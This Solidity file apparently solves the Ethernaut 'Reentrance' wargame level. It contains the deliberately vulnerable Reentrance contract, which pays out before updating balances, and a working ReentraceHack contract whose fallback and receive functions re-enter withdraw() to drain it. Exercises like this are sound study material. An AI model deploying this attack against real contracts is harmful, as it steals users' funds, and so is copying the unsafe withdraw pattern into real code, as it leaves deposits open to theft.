// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol";

contract ReentraceHack {

    event Callback(address sender, uint56 amount);

    Reentrance public reentranceContract;

    constructor(address _reentranceContractAddress) public {
        reentranceContract = Reentrance(payable(_reentranceContractAddress));
    }

    fallback() external payable {
        doCallback();
    }

    receive() external payable {
        doCallback();
    }

    function doCallback() private {
        uint256 amountToWithdraw = reentranceContract.balanceOf(address(this));
        emit Callback(msg.sender, uint56(amountToWithdraw));
        reentranceContract.withdraw(amountToWithdraw);
    }

    
    function donate() public payable {
        reentranceContract.donate{value: msg.value}(address(this));
    }

    function attack() public payable {
        uint256 amountToWithdraw = reentranceContract.balanceOf(address(this));
        reentranceContract.withdraw(amountToWithdraw);
    }

}


contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}